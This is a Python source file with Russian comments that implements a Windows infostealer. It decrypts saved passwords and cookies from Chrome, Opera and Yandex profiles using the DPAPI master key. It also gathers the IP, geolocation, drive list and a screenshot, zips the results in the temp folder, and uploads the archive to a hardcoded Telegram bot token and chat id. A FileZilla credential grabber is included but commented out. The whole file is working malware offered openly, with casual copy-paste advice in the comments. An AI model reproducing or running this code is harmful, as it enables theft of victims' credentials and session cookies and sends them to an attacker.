PasswordsArray = []  # Здесь будут логины пароли
CookiesDict = {}  # Тут будут куки в формате browser : [cookArray]


def db_dirs(path):  # Передаем путь к браузеру
        databases = set()  # Обьявляем список
        profiles_path = os.path.join(path, u'Local State')  #
        if os.path.exists(profiles_path):  #
            profiles = {'Default', ''}  #
            for dirs in os.listdir(path):  # Ищет профили
                dirs_path = os.path.join(path, dirs)  #
                if os.path.isdir(dirs_path) and dirs.startswith('Profile'):  #
                    profiles.add(dirs)  #
            with open(profiles_path) as f:
                try:
                    data = load(f)
                    profiles |= set(data['profile']['info_cache'])  # Нужно для получения мастер-ключа
                except Exception:
                    pass
            with open(profiles_path) as f:
                try:
                    master_key = b64decode(load(f)["os_crypt"]["encrypted_key"])
                    master_key = master_key[5:]
                    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]  # О, мастер-ключ
                except Exception:
                    master_key = None
            for profile in profiles:
                try:
                    db_files = os.listdir(os.path.join(path, profile))
                except Exception:
                    continue
                for db in db_files:
                    if db.lower() in ['login data', 'network']:
                        databases.add((os.path.join(path, profile, db),
                                       master_key))


        return databases


def decryption(buff, key):  # Нужна для декрипта, просто скопипасть, не парься
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def passwords(name, path, database_path, master_key):  # Ну пароли дешифрует, чо, какие вопросы
    if os.path.exists(path):
        copy(path, database_path)

        cursor = sqlite3.connect(database_path).cursor()

        cursor.execute('SELECT action_url, username_value, password_value FROM logins')

        for result in cursor.fetchall():
            url = result[0]
            login = result[1]
            try:
                password = decryption(result[2], master_key)
            except Exception:
                password = "Error"
            if url and login and password != '':
                PasswordsArray.append(
                    'Browser: ' + name + '\nLink: ' + url + '\nLogin: ' + login + '\nPassword: ' + password + '\n')


def cookies(name, path, database_path, master_key):
        Cookies = []  # Куки добавляются сюда
        copy(path, database_path)  # Копируем базу
        cursor = sqlite3.connect(database_path)
        cursor.text_factory = bytes
        cursor = cursor.cursor()  # Коннектимся к базе
        cursor.execute("SELECT * from cookies")  # Читаем куки

        all_ook = cursor.fetchall()


        for result in all_ook:
            cookie = str(decryption(result[5], master_key))
            names = str(result[3]).replace("b'", "'")
            url = str(result[1]).replace("b'", "'")
            Cookies.append(url +"\t"+ names +"\t"+ cookie)

        for i in range(0, 100):
            if i >= 1:
                if name + str(i) in CookiesDict:  # короч эта штука
                    continue  # если найдено несколько профилей
                else:
                    CookiesDict[name + str(i)] = Cookies  # то записывает куки
                    break
            else:
                if name in CookiesDict:  # с одного браузера
                    continue
                else:
                    CookiesDict[name] = Cookies  # В разные текстовики
                    break

def helper(name, path, database_path, master_key):

        if database_path.endswith("Network"):  # Оп, куки
            copyPath = path + '\Backup Cookies'  # Копируем бд, ибо читать из оригинала, когда запущен браузер, нельзя
            cookies(name, database_path+'\Cookies', copyPath, master_key)  # Дешифруем куки

        if database_path.endswith("Cookies"):  # Оп, куки
            copyPath = path + '\Backup Cookies'  # Копируем бд, ибо читать из оригинала, когда запущен браузер, нельзя
            cookies(name, database_path, copyPath, master_key)  # Дешифруем куки

        if database_path.endswith("Login Data"):  # Оп, пароли
            copyPath = path + '\Backup Password'
            passwords(name, database_path, copyPath, master_key)  # Дешифруем пароли

# def filezilla():
#        data = ''
#        if os.path.isfile(os.getenv("APPDATA") + '\\FileZilla\\sitemanager.xml') is True:
#            root = ET.parse(os.getenv("APPDATA") + '\\FileZilla\\sitemanager.xml').getroot()
#
#
#            for i in range(len(root[0])):
#                    host = root[0][i][0].text
#                    port = root[0][i][1].text
#                    user = root[0][i][4].text
#                    password = base64.b64decode(root[0][i][5].text).decode('utf-8')
#                    data += 'host: ' + host + '|port: ' + port + '|user: ' + user + '|pass: ' + password + '\n'
#
#            file = open(os.path.join(os.getenv("TEMP") + '\\Debug\\', "Filezilla.txt"), "w+", encoding='utf-8')
#            file.write(data)
#            file.close()



if __name__ == "__main__":  # Точка входа в программу

    chromium_browsers = {
            u'google chrome': os.getenv("LOCALAPPDATA") + r'\Google\Chrome\User Data',
            u'opera': os.getenv("APPDATA") + r'\Opera Software\Opera Stable',
            u'yandexBrowser': os.getenv("LOCALAPPDATA") + r'\Yandex\YandexBrowser\User Data',
            u'firefox': os.getenv("LOCALAPPDATA") + r'\Mozilla\Firefox\Profiles'
    }


    for browser, path in chromium_browsers.items():
        if os.path.exists(path):
            for database_path, master_key in db_dirs(path):  # Функция поиска баз и мастер-ключа
                helper(browser, path, database_path, master_key)  # Отправляет куки в декод куков, пароли в декод паролей

    try:
        os.makedirs(os.getenv("TEMP") + '\\Debug\\')  # Здесь будет наш архив
    except OSError:
        pass
    path_main = os.getenv("TEMP") + '\\Debug\\'

    #filezilla()


    drives = str(win32api.GetLogicalDriveStrings())
    drives = str(drives.split('\000')[:-1])
    response = DbIpCity.get(requests.get("https://ramziv.com/ip").text, api_key='free')
    all_data = "Time: " + time.asctime() + '\n' + "Кодировка ФС: " + sys.getfilesystemencoding() + '\n' + "Cpu: " + platform.processor() + '\n' + "Система: " + platform.system() + ' ' + platform.release() + '\nIP: ' + requests.get(
        "https://ramziv.com/ip").text + '\nГород: ' + response.city + '\nGen_Location:' + response.to_json() + '\nДиски:' + drives

    this_file = os.path.basename(sys.argv[0])
    this_file = this_file.split('.')


    zipload = zipfile.ZipFile(os.path.join(path_main, this_file[0] + ".zip"),
                              'w')  # Создаем архив и насовываем ему наши данные

    # if os.path.isfile(os.path.join(path_main, "Filezilla.txt")) is True:
    #     zipload.write(os.path.join(path_main, "Filezilla.txt"),
    #                   "\\Browsers\\" + os.path.basename(
    #                       os.path.join(path_main, "Filezilla.txt")))

    file = open(os.path.join(path_main, "Location.txt"), "w+", encoding='utf-8')
    file.write(all_data)  # Пишем geo в текстовик
    file.close()
    zipload.write(os.path.join(path_main, "Location.txt"),
                  "\\Browsers\\" + os.path.basename(
                      os.path.join(path_main, "Location.txt")))

    screen = ImageGrab.grab()
    screen.save(path_main + '\\sreenshot.jpg')
    zipload.write(path_main + '\\sreenshot.jpg', '\\sreenshot.jpg')



    if (len(PasswordsArray) > 0):
        file = open(os.path.join(path_main, "Passwords.txt"), "w+", encoding='utf-8')
        file.write("\n".join(PasswordsArray))  # Пишем пароли в текстовик
        file.close()
        zipload.write(os.path.join(path_main, "Passwords.txt"),
                      "\\Browsers\\" + os.path.basename(
                          os.path.join(path_main, "Passwords.txt")))  # Суем текстовик в архив, ниже кста также

    if (len(CookiesDict) > 0):
        for browser, cooks in CookiesDict.items():
            file = open(path_main + "\\" + browser + ".txt", "w+", encoding='utf-8')
            file.write('\n'.join(cooks))
            file.close()
            zipload.write(path_main + "\\" + browser + ".txt", "\\Cookies\\" + browser + ".txt")

    zipload.close()

    zipPath = os.path.join(path_main, this_file[0] + ".zip")
    token = "5413763772:AAHYSXGK-P0Ji2dFSDV_HRv_6TR50QOJyIo"
    chat_id = "1818358330"

    data = {'chat_id': chat_id}

    r = requests
    files = {'document': open(zipPath, 'rb')}
    response = r.post("https://api.telegram.org/bot" + token + "/sendDocument", files=files, data=data, timeout=(10, 200))
